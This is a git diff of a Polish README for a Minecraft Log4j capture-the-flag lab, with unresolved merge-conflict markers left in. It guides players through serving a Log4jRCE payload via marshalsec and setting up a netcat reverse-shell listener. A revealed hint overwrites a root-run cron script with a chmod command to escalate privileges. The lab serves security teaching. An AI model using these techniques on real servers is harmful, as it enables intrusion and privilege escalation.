@@ -3,11 +3,17 @@
 ## Wprowadzenie
 Witamy w `minecraft-ctf`, wyjątkowym wyzwaniu CTF stworzonym specjalnie dla Was! Twoim zadaniem będzie zdobycie flagi, wykorzystując podatność Log4j oraz kilka innych narzędzi, a to wszystko co najlepsze, z użyciem gry, którą chyba każdy zna! Przygotuj się na fascynujące wyzwanie! Owocnego hackowania i udanej zabawy!
 
+## Zasady CTF
+
+Uruchomiony kontener obrazu **kwasnyy/mcctf:mcexpl** jest atakowanym serwerem. Założenie jest, że nie masz do niego dostępu, nie masz o nim wiedzy (poza tym co piszemy tutaj). Więc zdobywanie wiedzy poprzez sprawdzanie `Dockerfile` albo włamywanie się poprzez `docker exec -it ID bash` jest bez sensu i nie jest rozwiązaniem CTF'a.
+Pozostałe uruchamiane kontenery są już twoją własnością, możesz robić z nimi co chcesz.
+
+
 ## Wymagania
-- Docker
-- Java (do uruchomienia clienta Minecrafta - jeśli jej nie masz, pobierz i zainstaluj)
-- Minecraft Launcher
-- NetCat (użyj WSL lub zainstaluj na Windowsie)
+- Docker,
+- Java (do uruchomienia clienta Minecrafta - jeśli jej nie masz, pobierz i zainstaluj),
+- [Minecraft Launcher](/SKlauncher-Universal-All-Versions.jar) albo jakikolwiek inny launcher,
+- NetCat (użyj WSL lub zainstaluj na Windowsie),
 
 ## HARD - Ogólny zarys postępowania
 1. Uruchom server docker z serverem Minecraft:
@@ -16,8 +22,8 @@ Witamy w `minecraft-ctf`, wyjątkowym wyzwaniu CTF stworzonym specjalnie dla Was
    - napoczęty `marshalsec/Dockerfile` może ci ułatwić,
    - tak samo masz `codehttp/` gdzie manipulować trzeba tylko linijką gdzie ustawia zmienną `cmd`,
 3. Interesujący cię plik jest umieszczony gdzieś na systemie,
-4. Rozejrzyj się po plikach w folderze `/server`
-5. Po odczytaniu flagi zapraszamy do wspólnej gry :)
+4. Rozejrzyj się po plikach w folderze `/server`,
+5. Po odczytaniu tajnego kodu zapraszamy do wspólnej gry :)
 
 
 ## EASY - Krok po kroku
@@ -70,14 +76,34 @@ Dwa spośród trzech odpalonych przez Ciebie kontenerów są "Twoje" - jako hack
             ```
 
             </details>
-         .4 
       - podczas budowania obrazu zostanie ten plik do niego skopiowany, a następnie skompilowany,
       - a po uruchomieniu kontenera, będzie serwowany plik "Log4jRCE.class" na porcie *:8888* tego kontenera,
       - zbuduj obraz: `docker build . -t codehttp`,
       - uruchom kontener: `docker run -p 8888:8888 -ti codehttp`,
 
+<<<<<<< HEAD
    3. **Interesujący cię plik jest umieszczony gdzieś na systemie:**
       - 
+=======
+### 3. Interesujący cię plik jest umieszczony gdzieś na systemie:
+   wyszukaj plik komendą `find / -name "flag.txt"`,
+
+### 4. Rozejrzyj się po plikach w folderze `/server`:
+   1. interesuje cię plik `cronjob.sh`,
+   2. zobacz na zawartość - wykonuje on backup świata minecrafta,
+   3. `ls -la /server/bqp` - zobacz kto jest właścicielem folderów - ten sam user ma w swoim cronie zamontowane uruchamianie tego skryptu,
+   4. podmień zawartość skryptu `cronjob.sh` na taką, która wykonana z uprawnieniami roota pozwoli na odczytanie pliku,
+   5. <details>
+      <summary><b>Pokaż komendę:</b></summary>
+      `echo "chmod 666 /usr/lib/jvm/jre1.8.0_181/lib/desktop/icons/LowContrast/16x16/mimetypes/flag.txt" > /server/cronjob.sh`
+      </details>
+
+### 5. Po odczytaniu flagi zapraszamy do wspólnej gry :)
+   0. postępuj zgodnie z instrukcjami klikając przyciski,
+   1. wprowadź flagę do skrzynki,
+   2. odczekaj chwilkę,
+   3. Zapraszamy do wspólnej gry! <3
+>>>>>>> all
 
 
 ## Twoje zadanie
@@ -85,7 +111,7 @@ Wykorzystaj podatność starej wersji Log4j i inne narzędzia do zdobycia ukryte
 
 ## Przydatne informacje
 
-uzyskania Reverse Shell
+### Uzyskanie Reverse Shell
 ```sh
 # Nasłuchuj na porcie `5000` na swoim komputerze:
 nc -l 5000
@@ -106,27 +132,22 @@ docker build . -t <nazwa-obrazu>
 docker run -p 25565:25565 -ti <nazwa-obrazu>
 ```
 
-### Konfiguracja EOL w VSCode
-```sh
-# Jeśli pracujesz na Windowsie, konieczna może okazać się zmiana EOL - End Of Line:
-- Otwórz `Minecraft-Log4j-Exploit/server/start_server.sh`.
-- Użyj `CTRL + SHIFT + P`.
-- Zmień `EOL sequence`.
-```
 
 ## Przydatne komendy 
 
 ### Docker
 ```sh
-docker build
-docker run
+docker build . -t <jakas nazwa>
+docker run -p <host>:<docker> -ti <jakas nazwa>
 docker ps
 docker ps -a
-docker kill <id>
-docker remove <id>
-docker image prune
-docker container prune
+docker kill <id>     # nie trzeba wpisywać całego id, wystarczy jednoznacznie identyfikujący początek
+docker remove <id>   # tu też, generalnie tak działa id
+docker image prune   # wywal nieuruchomione image
+docker container prune  # wywal zatrzymane kontenery (kontener po CTRL+C zostaje zatrzymany, a nie usunięty)
 ```
+
+<br>
 
 ## Credits
 - [Minecraft-Log4j-Exploit](https://github.com/Justin-Garey/Minecraft-Log4j-Exploit) od Justina Gareya
@@ -134,17 +155,4 @@ docker container prune
 - [Smallest Docker Image Static Website](https://lipanski.com/posts/smallest-docker-image-static-website) od Vladimira Lipanskiego
 - [Mapa Minecraft](https://www.minecraftxl.com/deep-sea-map/) od BlockWorks
 
-
-TODO:
-lf w starcie
-
-wejsc na server mc wpisac komende
-
-jak zatrzymać bash -uzyskania reverse shell?
-
-echo to wbudowana funkcja basha, a nie żadna binarka 
-
-allready allocated port: docker desktop delete container, 
-
-find / -name "*flag*" 2>/dev/null
 
